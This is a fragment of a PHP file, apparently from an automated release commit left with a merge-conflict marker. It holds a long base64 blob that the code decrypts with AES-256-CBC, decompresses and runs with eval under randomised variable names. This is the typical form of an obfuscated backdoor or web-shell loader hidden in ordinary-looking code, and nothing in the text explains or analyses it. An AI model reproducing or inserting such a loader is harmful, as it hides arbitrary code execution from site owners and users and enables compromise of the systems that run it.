NuaXBBbkFOb21JMkhKRHpkVWdqbHE0cjRkblZWdGhRVjFPSU91Uy9KL01KS1dkcWROZUx2anptV050S0ZsSDJBVGZBWGJ5ZkxoOW1NMXBFTURHeEROaWI2QVhIWGdmNmpBWEFDMDhkdUJzS0Y5OXdCQUxub3Z5b0I1V2kyVDhoYWVUTGIrZjNiNU13NTlJMEVHbElQK1hkRVhPejZQYnV4dTBIY3MwanRlNEFCa0REWWVSWVh3MVVYb3RvdCs3V2pyTnhuMHNDY0JyRmNoaW9YaTQ4dkpTTnIrWEVzUFlySmtrdVZQNXpQMmN5V01Sc21UYjJGY245cWtLeWxnVmhWR1dQUEJrR1pqK0p3QjU5WkkzdFByYVRhSjh5SzhwMFdWODZyL09oV2xmUmJGWWlkam1lUXNUTWUzbmR0OVlmeERIeC9xYXRETkRIeDJ6bS9hY2UyZzVsRDVJS3FiQi9lODgyVnd1eFhGV0JDN3h6K3BYa3pPeDFTMTdZQ29yNFpvcjlCek5XUUQrOElyUzVMVDEvUW1pTnN0Nk9yVUFUNWh6MHhTS0hlVFQxNitzYmZFQ2ZYSGh4NEFPc25PRGRtdit4WEo4TUNnVDBBRS83clU4dHhkRTFvZm0wSW5PZUw3TGgyWUlGY0lQY2RCTzJDSy9na1RzWUp0RjRYWnNZUlBYaHZ3M0s4UDJWYUIxMzhhUmZML2tjUTlGY3RvbWd1Tk01dE1xQkNUMEhoelNjZk05TTBMZ0VKWk93eVhNcmE0OTQ2OTJhUHJ2K2dESit4YjlkYWh2RVlsYVVDdXZ4c3VMUmVoZFV3TW0rZU1sQ0FnbDVSeGg0U3BOT3JEbThvalRad0dWQUdZc3VCckUrQml6U2x3ZklsRCsySWovVlZJejBkcWhpb2ROTFBHRGJCZVIzUkx6bkdIOGRUK2F1U0dJZHpEUElTbFR5WjZ3amxSS2krbWZINWMwQkhDQUFLb3VSeXorWWdPaEVHQk9kZ2ZPQmxmS2xCRmxGNkJMZXV1UXViS0RUdTZGZ0ZzSWNnZSt0RkRxMjBMR01ONVF5QWE1MlFpTVB5K2FseVNzRXBoUE9yeC9QTm5RZnYvMHdOeEN3QVg3OGt3ZGFTUy9GbklxU1QxZnBlRTdHR0UwRGRYazJWQWx4b1lrWHNKaFgxYi9LNGZ2MlVhZmpkbXQrTEtiNnhoV2d5VmU3dkI2Q2s2WkR5NUx1ZDhhWHVWcnl6cFArTGEvdHVwWmJjREo0MW9zWS92ZnRwWnhhaHN0ZlJ3U3BCZWJxcy9YUGd0SVI3UHBCczlaUXU3eUUzakJtWlFUVjg3THJwZGVVTkVRT1RXWG02TTJLRC9nUU9GN3JpSTJNRnFBSmVxWHVwamRRY3N2alpJT3did3JmMmhSblEzaWJzWW1yVGdHQm5BUGF5YlpNQ3lPRERMeVU2M0lPTkdwN0ZFMTJpbHltbmlQcjBvWXJIbHlMTHlDTHI0My9Tbjk3eGFFeGZ5UzZtbU1pYkRLTHh4a2g5cjRXV0NyQ1l3aDZSMjNqa3VBbElGSkhueXFCSWJGK0pQSHhRTzVLd0RVaVllaHFOYmdkZ2swVVFDS0xOazNYRlVQcm42L2k5M3hNSC94Z0ZmUWx0dG9Wb3Vja0t0U2hEQnpTMmRkeHBNK0QvRnpUcWpGV3Vtc1AvR3h3UEVWQlRRZzhnL0ZmVmhTeE1KNVc5YUo4ZEl6YWg5VG9iRVhZVm1UcG9jNnZCRzU4VFlTNDVUdXVHbGZHQlRHaWR6endqUjBSc1ljbHZndmpRS1ZyN1dmQTloYStETklLNGJ1QnZEdTJqZzZmRlA5WDhZQXpTWVVVM0UxNkUrdnlhUmlCL1VTN2J6TTQyOC9ZVWhOUTlZQ3Y3WTBYZlpDZUc2dS9FNUpYT0RiaWxmeU1iWC9Wd3RXSWdiT1lLQXluV0Q3VVhtSTdCSGtyWEtwUnlCTDllYm0rSXhkUFY0aFdRL0VpZ3ozb1lQajkxZGMvWDNDVllleE9mTnBwOWFoaGpHOVpOOU1wcXB2dU43WVZKbDl2K3hrd3dQakxDMTkyNU0yZ3AxYkZCRTMvNThtL2RMRGErSk1lM3JmRWhuWFBiaVdQS1c1SXMzdWxtK0IrSW93am1uNkIwQUFNMmU5Qzg5OWt1eWFzRHZGZFJCejZsRlRKbU5McWhkbHhWblhORVR6cW9pdWhnNW5BWm5LcFdQTmJrZ3g3ZkFZTEJYSlpQcCt2MHJvYXNPa2VVaGk4Q013RS93c0lNcVJsTWRaNHRhQkg0Q0EzcFZ1dExNNHlaMkhqc0ZXV096dTBJaUlRU3cwV05wSkVSbkw5QUt0V0NiVVNGT0tFeGpxV3RsWUMySmdNdDEyOVQzYjBVS2F4QmFJbkMwMVVNeWdoMk9WM0ZvMFlaampUVmVkRUczMktYUmNGUWR3ODAvalJ0MnVpSTZHVFV1ckp6ZlpKRGxJL1lHVXNWWEViTlNYbnE2T1VuS3lWbktNeDFaNDFYckxOSmVETFJ5RGZhYmpGc1J4U2VFMUEzM0FsZ3ZrYm4zQWtvZEVKRjNJVk9vRVpnQkZFbXIydmdOVllmYzNzWWpiK3c0M3kyS1QrcEgzVGdOdUsybUhJTXMwNVlocDdnL0d5citlUGlUZmhzTmlBYkE2cGRuem9SeCtSSEFQLzJLcFVvUXVDRm9mamwrb1EzU1drZEtVTGZvT0pzR2hFQ2hLTGJCR1ZVZkFRYytsdGNkQ2ZXQlZDNFdnVlgwdnlOemM0alJ5NGxhc1ZHS3JLd0ladmZZbHFsVDN5OUlUd21qZWg3b1pSbHdMZkdQekxvK1JOQkMxQzdBRHpaWHVVUnZZQVhPQzF5cG9URzBMdDRTVTcxYUU2T1dVcVpmUmlFSVNJVkVhVlM5Tlg2WVJJNzdYeEJZa2lsUWFyWWpPNWxPMWxDNmdBMWMzb3FMOElJUFRxTk9SbGI3aWgzdVVzN1cyS3RHMG1CNnBIVFJZeGovOUlVdzhIRTgyUktVd1gzcGdIRXZaMWFnMDZkemx4SGttZndZVjBPTThFTVlvUjRZelM0Zmd4ZmR0S3BFOVNWMlZKV0NvcE1wcCtUbVhHR3FZaTY0bWthcUdKSmpaVXRkYmV5NDNwM0I5RWxQaEZiS1VadC9KeEFPY3dWN1Zmdithb1BRbzVTR1Awa1BvNitBQzU0dHRLdThxT20xZWVTOWViSlZnTGtoOE5vdlg2eEVWSHhJMHdkdWhOODRFYkd5UHRqL3lFd3d2OS9CVTk3bTNmTi9DSFpFVnQvaDFDYVNkZ3JzYjZKY04xcHZIVTdWREZzd21kQWlZYzF6eUtvYldqZ1p4aTE2dy9SNUhWbFNMYU41aHdjT2h3RzduN1pDc2R5czA5UVBDWGcveTR2V3c3Y0JvcThnZUx0T0RwSkhZUFFIeFFVajJZNjluQUY1OEN4R3ZQQ29panBFcVhwQnh0S1ZIVkJCdy94VDNZUFZ1NWNIeEw3VjBiWWtnRC9lc3VScVlROWFISWxKb0FJM0drOFFZTVdKS2E5d3FCR1A2eTBlSFV3d0R3d0ZqWjBUdWFDanZJZ0dRZ2pyaFo5VjVvaUp2M1poN2JXRW9YdHNpL1VUSTZyNUdXTjBTeGdpYmJXTmdnR1RZdCtJOEdBb2wyY0tYZzNYSXZIeE5JT0QvZmFQaUF1b2YrbmhCUzhxZzRtdXBXYU5kRWZScmMrL1gzU1RFQm5zMG5rWnRGQ3h0bzhaUS9mcjNMRGxmUEVFdVhLRWZvRk1MdkViMFIxdmNaT2E5RTR3WXFWVzZoTHhUb2NwcWVPcVN0cXJBVWcrQ0dJOU4wS2dEZ0Zwa3l3SFhVRE52YlhKOG5wS0VNejZ1Mjk3Z3phazBQYXZtOVhJRitBRGdDNWZUQjJqUVpyQXFoVDl0TnYyc2FmZjJKWWYrRlJHRjJ2TkFVRzdxUkNlaisrRXVwMzRNS29HakZ1cDJBU1hIS3VJMFB2c0NPZ1hiSXlNbHMrczVzRTMzMzFvVGJNd2doa2hiMFZOQ2lPSmN5NVplZ2Vqa3BUNXlESkpFSXRlNENPTUtVVm1rbjhCdHlEd3B6dFc2MllZbVQxZkVGeHRLWFM3UFpjd2llUWxYWXp4SUdkNkVoa3c4cCtnc1N3T0QzRDM1QnhFR2dSQUJzVmhBdzZnZWoxeGcvbnZaMU1XaU1MZEhycC9qbDhDL1AzV1VVdjd1REVZaDRZb2gwYmx2MTNhR1RtdG80QzBCK2VpU3ZmMkpjVXFTMVVRL0VRTTB5MmdHREpRS0VBRHNyYW4xYXlNcWowS1hxL1FNWkFFbDdFaTZiR0pDUTRqYVBNeGxGNkw4SWpvdDJZcnR6ai9BTzdtNWpFUU8za2QxZ1JYVjhONWpBQzVueXVPSkd0RzMreUc4UzN6Ym1Fem8zSHRVQUY1NDdmRnA5WnhhYlMvNXltb1VQZTRmLzJ0VUpJVWdHOEhabTgvMWljYmo1bnVQWkZBMFNnQlk2eUtTT243VGd2OEt6T3lUUjlwcE0vaEE1STVQTkM3R2xBZ1lXVzFXa0ZIQld5ZitjTlJhUk1LNEZINWdIN3c2MFN4MUNpQTNJVE9WMmRxTTlHa2pCZ1B0cVJYaEpPNlVFcHhvOTFJQzQzbDByOExybDBYc0JLc0JJdHF3SzY0SURNanplb0RIWXpYSjBsRVRRSzdkTGFScXE4K2EvSCs5U0EwL2JsK2ZSRC8zVW91Y09LRXMzKzl2dStRb0VBQVpKVjBQelQrOUZwVmw5WU1sM2dNcVlUY3RTT1dPeS9iY1h3SnFhT2YzQTFpTU9lVXRGQ1VCOS9Ea0VHQnBscUw0eitRZGM3YTFVTXNWYWE5TDFOTlBwRTVBTDYzNFpEOEk2NHBSSkdXR3FCeVY5VFZWSTFBZDZKZlIxQTZQVms4enZETTdaRkxvbXFmdXI3Y1g1bzFPbDZDZ1BnTkhTTzNYMEZyeHdNbDZ4SlR6MkVGNXFNZnBES2FrQjNvckNlZzkwYS9vWFVnaDB6QW8wYlpZMTVUdVkwVEMzcEgrZ2x1TGo1WWg0VXdSajUvdWRSQ0h3aDB1c1B5U1RzaHVPdmZhMk9DYThXZjM4eFpHRUg2b2tkejkrcVpZZ2NxSGlsMHM0SjlUaXpuKzhpQzVqNWgweTJxR1dIU2pyTWptRk55TFhmS25oR1pFdldjQ1VwUUZKcjhBcm1YamxEdkdVL0FwT0xLQnlJVWZCQlEwbzNHbWY2Kzd3SnRTQ2pndXczUEdxektaM3JQUWh4bVBDVyt2ZCtnR21iT1p6Z2cvM2o5T1FFNUkzZEg5azR5SkZPVGpERlR6QVFyOVNhT1VOYW9PcWUrYlhxbEVpZ2pHbWU1VlQ3aGtPT3VmNGtTWk91a3dvOENGKzJPS0g5S1JUOU9URkZOSlRXcUtva296NDk1Zzg1WEdnNHR5V0RTbVA0RmpZMzNCZW9BS21UU0FVM2lYVTgyVUx0MUtqcmlYeldXakp1Ykd2');
$if887c = openssl_cipher_iv_length('aes-256-cbc');
$v8f742 = substr($p7a20d, 0, $if887c);
$c0ea03 = substr($p7a20d, $if887c);
eval('?>'.gzinflate(openssl_decrypt($c0ea03, 'aes-256-cbc', $k19cda, 0, $v8f742)));
>>>>>>> 992e6cb (Automated Release v1.7.127 (Build 2026-08-25 09:55))
